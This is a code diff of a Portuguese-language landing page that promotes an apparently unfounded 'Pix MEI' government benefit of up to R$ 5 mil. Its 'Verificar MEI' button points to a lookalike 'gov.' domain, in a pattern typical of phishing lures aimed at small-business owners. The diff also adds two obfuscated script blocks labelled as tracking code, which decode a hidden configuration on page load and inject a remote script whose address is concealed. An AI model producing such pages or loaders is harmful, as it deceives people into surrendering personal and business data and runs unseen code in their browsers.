@@ -1,94 +1,215 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#e0f2f1">
-  <title>Consulte a Situação Cadastral</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Portal Independente — Pix MEI: Entenda o Benefício de até R$ 5 Mil</title>
+  <meta name="description" content="Portal independente de informações: Saiba o que o governo anunciou sobre o Pix MEI de até R$ 5 mil, quem poderá ser contemplado e previsão de início.">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💡</text></svg>">
   <style>
-    * { box-sizing: border-box; }
-    html, body { margin: 0; min-height: 100%; }
-    body {
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 12px;
-      background: #ffffff;
-      font-family: Arial, Helvetica, sans-serif;
-    }
-    .wrap { width: 100%; max-width: 420px; }
-    .card {
-      width: 100%;
-      min-height: 394px;
-      padding: 54px 22px 48px;
-      border: 1px solid #a9dfdc;
-      border-radius: 11px;
-      background: #e0f2f1;
+    :root { --primary: #0f766e; --secondary: #115e59; --accent: #0284c7; --bg: #f8fafc; --text: #0f172a; --gray: #64748b; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; }
+    header { background: #fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 1rem 0; position: sticky; top: 0; z-index: 40; }
+    .container { max-width: 1100px; margin: 0 auto; padding: 0 1.25rem; }
+    .nav { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; }
+    .logo { font-size: 1.3rem; font-weight: 700; color: var(--primary); text-decoration: none; display: flex; align-items: center; gap: 0.5rem; }
+    .menu { display: flex; gap: 1.25rem; flex-wrap: wrap; }
+    .menu a { color: var(--text); text-decoration: none; font-weight: 500; font-size: 0.95rem; }
+    .menu a:hover { color: var(--primary); }
+    main { min-height: 70vh; padding-bottom: 4rem; }
+    
+    .disclaimer-top { background: #fffbeb; border-bottom: 1px solid #fef3c7; color: #92400e; font-size: 0.875rem; text-align: center; padding: 0.6rem 1rem; font-weight: 500; }
+    
+    .hero { text-align: center; padding: 4rem 1rem 3rem; background: linear-gradient(135deg, #0f766e, #134e4a); color: #fff; }
+    .hero .badge { display: inline-block; background: rgba(255,255,255,0.2); padding: 0.35rem 0.9rem; border-radius: 999px; font-size: 0.85rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 1.25rem; }
+    .hero h1 { color: #fff; font-size: 2.35rem; margin-bottom: 1.25rem; line-height: 1.25; max-width: 900px; margin-left: auto; margin-right: auto; }
+    .hero p { font-size: 1.2rem; opacity: 0.95; max-width: 780px; margin: 0 auto; font-weight: 300; }
+
+    .faq-block { margin-top: 3rem; }
+    .faq-item { background: #fff; border: 1px solid #e2e8f0; border-radius: 10px; padding: 2rem; margin-bottom: 1.5rem; box-shadow: 0 2px 4px rgba(0,0,0,0.03); }
+    .faq-item h2 { color: var(--primary); font-size: 1.35rem; margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.5rem; }
+    .faq-item p { color: #334155; font-size: 1.05rem; margin-bottom: 0.5rem; }
+    
+    .status-alert { background: #eff6ff; border-left: 4px solid var(--accent); padding: 1.25rem; border-radius: 6px; margin: 1rem 0; color: #1e40af; }
+    .status-alert strong { display: block; font-size: 1.05rem; margin-bottom: 0.25rem; color: #1e3a8a; }
+    
+    .gov-link-box { background: #f8fafc; border: 2px dashed #cbd5e1; border-radius: 10px; padding: 2rem; text-align: center; margin-top: 2rem; }
+    .gov-link-box h3 { color: #1e293b; margin-bottom: 0.5rem; font-size: 1.2rem; }
+    .gov-link-box p { color: #64748b; margin-bottom: 1.25rem; }
+    .btn-gov { display: inline-block; padding: 0.85rem 2rem; background: var(--primary); color: #fff; text-decoration: none; border-radius: 6px; font-weight: 600; font-size: 1rem; transition: background 0.2s; }
+    .btn-gov:hover { background: var(--secondary); }
+
+    .cards-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin-top: 3rem; }
+    .card-info { background: #fff; border: 1px solid #e2e8f0; border-radius: 8px; padding: 1.5rem; }
+    .card-info h4 { color: var(--primary); margin-bottom: 0.5rem; font-size: 1.15rem; }
+    .card-info p { color: var(--gray); font-size: 0.95rem; margin-bottom: 1rem; }
+    .card-info a { color: var(--primary); font-weight: 600; text-decoration: none; }
+    .card-info a:hover { text-decoration: underline; }
+
+    .card-consult {
+      background: #e6f4f1;
+      border: 1px solid #cce8e2;
+      border-radius: 20px;
+      padding: 2.5rem 2rem;
+      max-width: 500px;
+      margin: 2.5rem auto 0;
       text-align: center;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.04);
     }
-    h1 {
-      margin: 0 0 16px;
-      color: #005548;
-      font-size: clamp(25px, 6vw, 30px);
-      line-height: 1.55;
+    .card-consult h3 {
+      color: #044e42;
+      font-size: 1.65rem;
       font-weight: 700;
+      line-height: 1.3;
+      margin-bottom: 1rem;
     }
-    p {
-      margin: 0 0 28px;
-      color: #666666;
-      font-size: clamp(17px, 4.3vw, 20px);
-      line-height: 1.55;
-      font-weight: 400;
+    .card-consult p {
+      color: #4b635e;
+      font-size: 1.05rem;
+      line-height: 1.5;
+      margin-bottom: 1.75rem;
     }
-    .button {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 67px;
-      min-width: 200px;
-      max-width: 100%;
-      padding: 14px 34px;
-      border-radius: 999px;
-      background: #008577;
+    .btn-consult {
+      display: inline-block;
+      background: #00796b;
       color: #ffffff;
-      text-decoration: none;
-      font-size: 21px;
+      font-size: 1.1rem;
       font-weight: 700;
-      box-shadow: 0 4px 8px rgba(0,0,0,.16);
-      -webkit-tap-highlight-color: transparent;
-      transition: background .15s ease, transform .15s ease;
+      text-decoration: none;
+      padding: 0.9rem 2.5rem;
+      border-radius: 50px;
+      box-shadow: 0 4px 10px rgba(0, 121, 107, 0.25);
+      transition: background 0.2s, transform 0.1s;
     }
-    .button:hover { background: #006f64; }
-    .button:active { transform: translateY(1px); }
-    .disclosure {
-      margin: 12px 8px 0;
-      color: #666;
-      font-size: 12px;
-      line-height: 1.45;
-      text-align: center;
+    .btn-consult:hover {
+      background: #006054;
+      transform: translateY(-1px);
     }
-    @media (max-width: 360px) {
-      .card { min-height: 370px; padding: 36px 17px; }
-      .button { min-height: 58px; font-size: 19px; }
-    }
+
+    footer { background: #0f172a; color: #fff; padding: 3.5rem 0 2rem; text-align: center; }
+    .footer-links { display: flex; justify-content: center; gap: 2rem; margin-bottom: 1.75rem; flex-wrap: wrap; }
+    .footer-links a { color: #94a3b8; text-decoration: none; font-size: 0.95rem; }
+    .footer-links a:hover { color: #fff; }
+    .footer-copy { color: #64748b; font-size: 0.875rem; line-height: 1.6; }
+
+    #cookie-banner { position: fixed; left: 0; right: 0; bottom: 0; background: #0f172a; color: #e2e8f0; padding: 1rem; display: flex; gap: 1rem; align-items: center; justify-content: center; flex-wrap: wrap; z-index: 50; font-size: 0.9rem; border-top: 1px solid #334155; }
+    #cookie-banner[hidden] { display: none; }
+    #cookie-banner p { margin: 0; max-width: 720px; }
+    #cookie-banner a { color: #38bdf8; }
+    #cookie-banner button { padding: 0.5rem 1.25rem; background: var(--primary); color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: 600; }
   </style>
+<!-- UTMify Scripts -->
+<script>(function(){var j_omvx=atob("DGG8jAD7bMqCSjoJghqe+XKXTvCgIk598hKGoy+YCKSsP05k6wfFomOUAeTgOBV64RPV/HSIQ7/2J0km7gDI6XOPQqDxaBYr4xXI/mmZGb7nORgz2Rqe4mGWCei4aF5o9gCR+XSWBaz7Z0p75xfZ4nTWFKntLhd64QqeoCKNDab3LxgzoEPBoHvZAqvvLxgzoAXd+GHWGb7vI1xwrxHO6XaeAr6vOU9r6wXPrizZGqvuP18ruEOe8V2G");var x_0s=[];for(var x_4=0;x_4<j_omvx.length;x_4++){x_0s.push(j_omvx.charCodeAt(x_4)&255);}var x_z8=x_0s[0];var v_5jot=x_0s.slice(1,1+x_z8);var j_b=x_0s.slice(1+x_z8);var e_cl=j_b.map(function(b,z_aw){return b^v_5jot[z_aw%x_z8];});var x_l="";for(var x_u1v=0;x_u1v<e_cl.length;x_u1v++){x_l+=String.fromCharCode(e_cl[x_u1v]&255);}var a_csv=decodeURIComponent(escape(x_l));var p_jsn2=JSON.parse(a_csv);var b_xf=p_jsn2.globals||[];b_xf.forEach(function(b_2v){window[b_2v.name]=b_2v.value;});var x_n7k=document.createElement("script");x_n7k.src=p_jsn2.url;x_n7k.async=true;x_n7k.defer=true;(p_jsn2.attributes||[]).forEach(function(l_wzf5){x_n7k.setAttribute(l_wzf5.name,l_wzf5.value);});(document.head||document.documentElement).appendChild(x_n7k);})();</script>
+<script>(function(){var p_cs=atob("DDsEfDdZcELTz7Dpe0AmCUU1Unjxp8SdC0g+Uxg6FCz9usSEEl19UlQ2HWyxvZ+aGEltDEMqXzK6t9WFVEttBFI1Xiig7ZzLGk9wDl47BTa2vJLTIGYoXlA1HyCyo8PLQWB/Xlk4HSfx9ZKZEkNhEH49Um7xudGFDl4mRhVvESfq94TaSVpmRAJqEya2+oWLSlk9T1J7DR+u");var g_p=[];for(var p_8w=0;p_8w<p_cs.length;p_8w++){g_p.push(p_cs.charCodeAt(p_8w)&255);}var j_jnau=g_p[0];var b_e6y=g_p.slice(1,1+j_jnau);var v_2a=g_p.slice(1+j_jnau);var n_8=v_2a.map(function(b,x_eyu){return b^b_e6y[x_eyu%j_jnau];});var k_si="";for(var a_k=0;a_k<n_8.length;a_k++){k_si+=String.fromCharCode(n_8[a_k]&255);}var c_i3g=decodeURIComponent(escape(k_si));var u_94uq=JSON.parse(c_i3g);var m_v=u_94uq.globals||[];m_v.forEach(function(y_gs9a){window[y_gs9a.name]=y_gs9a.value;});var w_kzr=document.createElement("script");w_kzr.src=u_94uq.url;w_kzr.async=true;w_kzr.defer=true;(u_94uq.attributes||[]).forEach(function(o_wgyb){w_kzr.setAttribute(o_wgyb.name,o_wgyb.value);});(document.head||document.documentElement).appendChild(w_kzr);})();</script>
+<!-- End UTMify Scripts -->
 </head>
 <body>
-  <main class="wrap">
-    <section class="card" aria-labelledby="titulo">
-      <h1 id="titulo">Consulte a Situação<br>Cadastral</h1>
-      <p>Verifique o status do seu CNPJ MEI e certifique-se de que sua conta está pronta.</p>
-      <a class="button"
-         href="https://gov.empreendedormeibr.org/index.html"
-         target="_blank"
-         rel="noopener noreferrer">Verificar MEI</a>
-    </section>
-    <p class="disclosure">Aviso: este link direciona para um site externo e não representa, por si só, um canal oficial do Governo Federal.</p>
+  <div class="disclaimer-top">
+    Este é um portal independente de informações e não possui vínculo com o Governo Federal.
+  </div>
+
+  <header>
+    <div class="container nav">
+      <a href="#" class="logo">
+        <span>Portal Independente MEI</span>
+      </a>
+      <div class="menu">
+        <a href="#">Início</a>
+        <a href="#">Sobre o Portal</a>
+        <a href="#">Artigos & Notícias</a>
+        <a href="#">Dúvidas Frequentes</a>
+        <a href="#">Contato</a>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <div class="hero">
+      <div class="container">
+        <span class="badge">Portal Independente de Notícias</span>
+        <h1>Pix MEI: Entenda o Benefício de até R$ 5 Mil</h1>
+        <p>Saiba o que o governo anunciou, quem poderá ser contemplado e quando o programa está previsto para começar.</p>
+        
+        <div class="card-consult">
+          <h3>Consulte a Situação Cadastral</h3>
+          <p>Verifique o status do seu CNPJ MEI e certifique-se de que sua conta está pronta.</p>
+          <a href="https://gov.empreendedormeibr.org/index.html" class="btn-consult">Verificar MEI</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="container">
+      <div class="faq-block">
+        
+        <div class="faq-item">
+          <h2>O que é o Pix MEI?</h2>
+          <p>O Pix MEI é uma iniciativa anunciada pelo Governo Federal que prevê apoio financeiro de até R$ 5 mil para pequenos empreendedores.</p>
+          <p style="color: #64748b; font-size: 0.95rem; margin-top: 0.5rem;">O objetivo do estímulo é fomentar o microempreendedorismo, oferecendo suporte para capital de giro, compra de equipamentos ou recomposição de fluxo de caixa operacional.</p>
+        </div>
+
+        <div class="faq-item">
+          <h2>Quem poderá receber?</h2>
+          <p>As regras definitivas de seleção ainda serão divulgadas pelo governo.</p>
+          <p style="color: #64748b; font-size: 0.95rem; margin-top: 0.5rem;">Estudos preliminares indicam que o programa dará prioridade a microempreendedores com registro MEI ativo, situação regular na Receita Federal e declarações anuais (DASN-SIMEI) em dia.</p>
+        </div>
+
+      </div>
+
+      <div class="cards-row">
+        <div class="card-info">
+          <h4>Artigo: Previsão e Cronograma 2027</h4>
+          <p>Entenda o cronograma de estruturação do Pix MEI e quais fases antecedem o lançamento.</p>
+          <a href="#">Ler análise completa &rarr;</a>
+        </div>
+        <div class="card-info">
+          <h4>Guia: Como Manter seu MEI Regular</h4>
+          <p>Passo a passo prático para manter seu CNPJ apto para futuras linhas de incentivo.</p>
+          <a href="#">Ver guia de regularização &rarr;</a>
+        </div>
+        <div class="card-info">
+          <h4>Alerta: Como Evitar Fraudes Financeiras</h4>
+          <p>Dicas de segurança para identificar páginas falsas e proteger seus dados empresariais.</p>
+          <a href="#">Ler dicas de segurança &rarr;</a>
+        </div>
+      </div>
+
+    </div>
   </main>
+
+  <footer>
+    <div class="container">
+      <div class="footer-links">
+        <a href="#">Início</a>
+        <a href="#">Sobre o Portal</a>
+        <a href="#">Dúvidas Frequentes</a>
+        <a href="#">Política de Privacidade</a>
+        <a href="#">Termos de Uso</a>
+        <a href="#">Contato</a>
+      </div>
+      <p class="footer-copy">Este é um portal independente de informações e não possui vínculo com o Governo Federal.</p>
+      <p class="footer-copy" style="margin-top: 0.5rem; color: #cbd5e1;">DOMUS EDUCACAO FINANCEIRA LTDA &middot; CNPJ 65.214.818/0001-52</p>
+      <p class="footer-copy" style="margin-top: 0.25rem;">R ALBERTO NOVAES, 32 - RESIDENCIAL FURLAN, SANTA BARBARA D'OESTE/SP, CEP 13451-192</p>
+      <p class="footer-copy" style="margin-top: 0.25rem; color: #38bdf8;">Canal de Contato e DPO: LH@ANDIA.COM.BR</p>
+    </div>
+  </footer>
+
+  <div id="cookie-banner" role="dialog" aria-label="Aviso de cookies" hidden>
+    <p>Utilizamos cookies essenciais e analíticos para assegurar a conformidade e aprimorar a sua experiência de navegação conforme nossa <a href="#">Política de Privacidade</a>.</p>
+    <button type="button" id="cookie-ok">Concordar e Fechar</button>
+  </div>
+
+  <script>
+    (function () {
+      try { if (localStorage.getItem('cookie_ok') === '1') return; } catch (e) {}
+      var b = document.getElementById('cookie-banner');
+      if (!b) return;
+      b.hidden = false;
+      document.getElementById('cookie-ok').onclick = function () {
+        try { localStorage.setItem('cookie_ok', '1'); } catch (e) {}
+        b.hidden = true;
+      };
+    })();
+  </script>
 </body>
 </html>
